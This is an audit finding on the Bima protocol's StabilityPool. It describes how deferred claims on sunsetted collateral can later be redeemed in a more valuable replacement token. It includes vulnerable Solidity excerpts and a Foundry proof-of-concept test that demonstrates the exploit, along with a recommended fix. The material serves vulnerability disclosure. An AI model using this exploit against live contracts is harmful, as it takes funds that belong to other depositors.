---
# Core Classification
protocol: Bima
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 46271
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/4e5e0166-4fc7-4b58-bfd3-18c61593278a
source_link: https://cdn.cantina.xyz/reports/cantina_competition_bima_december2024.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 4
finders:
  - pkqs90
  - etherSky
  - T1MOH
  - santipu
---

## Vulnerability Title

Users can easily obtain new collateral by leveraging sunsetted collateral 

### Overview


This bug report discusses an issue where users can exploit the system to receive disproportionate rewards by delaying the claiming of their gains and waiting for a more valuable collateral to be added. This can result in undeserved profits for the user. The report suggests tracking collateral gains per collateral instead of using an index to prevent this issue.

### Original Finding Content

## Context
(No context files were provided by the reviewer)

## Summary
Certain collaterals may be sunsetted by the owner. After 180 days, these sunsetted collaterals can be replaced by newly added ones. Users can claim the new collateral using the gains from their old sunsetted collateral. This could pose a significant problem if the newly added collateral is much more valuable than the old one.

## Finding Description
Suppose there is a collateral priced at 1 USD. A user gains 100 units of this collateral through offset but doesn’t immediately claim the rewards. Instead, they update their `collateralGainsByDepositor` by calling the `claimReward` function without actually claiming the gains. This allows the user to defer the claim and retrieve these gains at any time in the future. Suppose a collateral is sunsetted, and 180 days have passed.

### Code Reference - StabilityPool.sol#L241
```solidity
function _overwriteCollateral(IERC20 _newCollateral, uint256 idx) internal {
    require(indexByCollateral[_newCollateral] == 0, "Collateral must be sunset");
    uint256 length = collateralTokens.length;
    require(idx < length, "Index too large");
    indexByCollateral[_newCollateral] = idx + 1;
    collateralTokens[idx] = _newCollateral;
}
```

Before new collateral is added, the user checks its price. If the price of the new collateral is lower than the old one, they immediately claim their old gains. However, if the price of the new collateral is significantly higher (e.g., 1,000 USD), they delay claiming their old gains and wait for the new collateral to accumulate. During some period, the new collateral is transferred to the Stability Pool through offsets. Once sufficient new collateral is gathered, the user claims their gains, but now in terms of the new, more expensive collateral.

### Code Reference - StabilityPool.sol#L792
```solidity
function claimCollateralGains(address recipient, uint256[] calldata collateralIndexes) external {
    claimReward(recipient);
    uint256[] memory collateralGains = new uint256[](collateralTokens.length);
    uint80[MAX_COLLATERAL_COUNT] storage depositorGains = collateralGainsByDepositor[msg.sender];
    for (uint256 i; i < collateralIndexes.length; ) {
        uint256 collateralIndex = collateralIndexes[i];
        uint256 gains = depositorGains[collateralIndex];
        if (gains > 0) {
            collateralGains[collateralIndex] = gains;
            depositorGains[collateralIndex] = 0;
            collateralTokens[collateralIndex].safeTransfer(recipient, gains);
        }
        unchecked {
            ++i;
        }
    }
}
```

This creates a serious issue because the user's gains, which should have been worth 100 USD (e.g., 100 units of the old collateral at 1 USD each), are now received as 100 units of the new collateral, valued at 1,000 USD each. This results in a total gain of 100,000 USD, which is disproportionately higher than the original value.

### Proof of Concept Log
- **The initial collateral gain of User1:** 1000000000000000000
- **The current collateral gain of User1:** 1000000000000000000
- **The balance of the new Collateral before claim:** 0
- **The balance of the new Collateral after claim:** 1000000000000000000

## Impact Explanation
Users could exploit this mechanism to gain extraordinary rewards, which rightfully belong to other depositors.

## Likelihood Explanation
The sunsetting process is one part of the system design. Also, the prices of collaterals vary. Furthermore, the attackers incur no losses.

## Proof of Concept
Please add the following test file to the `test/foundry` directory:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import {TestSetup, IIncentiveVoting, SafeCast} from "./TestSetup.sol";
import {StakedBTC} from "../../contracts/mock/StakedBTC.sol";
import {Factory, IFactory} from "../../contracts/core/Factory.sol";
import {PriceFeed} from "../../contracts/core/PriceFeed.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console2.sol";

contract TestStabilityPoolTest1 is TestSetup {
    function setUp() public virtual override {
        super.setUp();
        /**
        only 1 collateral token exists due to base setup.
        */
        assertEq(stabilityPool.getNumCollateralTokens(), 1);
        
        /**
        The collateral token is stakedBTC.
        */
        assertEq(address(stabilityPool.collateralTokens(0)), address(stakedBTC));
    }

    function test_stabilityPool_sunset() external {
        uint256 depositAmount = 20e18;
        vm.prank(address(borrowerOps));
        debtToken.mint(users.user1, depositAmount);
        assertEq(debtToken.balanceOf(users.user1), depositAmount);
        
        vm.prank(users.user1);
        /**
        User1 provides debtTokens to the Stability Pool.
        */
        stabilityPool.provideToSP(depositAmount);
        
        vm.prank(address(liquidationMgr));
        /**
        For testing purposes:
        - A 1e18 debt loss occurs.
        - A 1e18 collateral gain is applied.
        */
        stabilityPool.offset(stakedBTC, 1e18, 1e18);
        
        vm.prank(users.owner);
        /**
        The stakedBTC collateral is sunsetted.
        */
        stabilityPool.startCollateralSunset(stakedBTC);
        
        /**
        After 200 days, the stakedBTC can be replaced with new collateral.
        */
        vm.warp(block.timestamp + 200 days);
        
        /**
        The initial collateral gain of User1: 1000000000000000000
        */
        uint256[] memory collateralGains_1 = stabilityPool.getDepositorCollateralGain(users.user1);
        console2.log('The initial collateral gain of User1 = > ', collateralGains_1[0]);
        
        vm.prank(users.user1);
        /**
        To update collateralGainsByDepositor, User1 calls the claimReward function.
        */
        stabilityPool.claimReward(users.user1);
        
        vm.prank(users.owner);
        StakedBTC newCollateral = new StakedBTC();
        
        vm.prank(address(factory));
        /**
        A new collateral token is enabled. (Suppose this new collateral is much more valuable than stakedBTC.)
        */
        stabilityPool.enableCollateral(newCollateral);
        
        vm.prank(users.owner);
        /**
        For testing purposes, transfer some of the new collateral to the Stability Pool.
        In real scenarios, these tokens are typically collected through offsets.
        */
        newCollateral.transfer(address(stabilityPool), 1e18);
        
        /**
        The current collateral gain of User1 remains unchanged.
        */
        uint256[] memory collateralGains_3 = stabilityPool.getDepositorCollateralGain(users.user1);
        console2.log('The current collateral gain of User1 = > ', collateralGains_3[0]);
        console2.log('*************');
        
        /**
        The balance of the new Collateral before claim: 0
        */
        console2.log('The balance of the new Collateral before claim => ', newCollateral.balanceOf(users.user1));
        uint256[] memory collateralIndexes = new uint256[](1);
        collateralIndexes[0] = 0;
        
        vm.prank(users.user1);
        /**
        User1 claims their collateral.
        */
        stabilityPool.claimCollateralGains(users.user1, collateralIndexes);
        
        /**
        The balance of the new Collateral after claim: 1000000000000000000
        */
        console2.log('The balance of the new Collateral after claim => ', newCollateral.balanceOf(users.user1));
        
        /**
        User1 could receive the same amount of new collateral in place of the old collateral.
        If the new collateral is significantly more valuable than the old collateral, this could result in undeserved profits for User1.
        */
    }
}
```

## Recommendation
Track collateral gains per collateral instead of index.  
- `mapping(address depositor => uint80[MAX_COLLATERAL_COUNT] gains) public collateralGainsByDepositor;`
+ `mapping(address depositor => mapping(IERC20 => uint80) gains) public collateralGainsByDepositor;`

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Bima |
| Report Date | N/A |
| Finders | pkqs90, etherSky, T1MOH, santipu |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_bima_december2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/4e5e0166-4fc7-4b58-bfd3-18c61593278a

### Keywords for Search

`vulnerability`

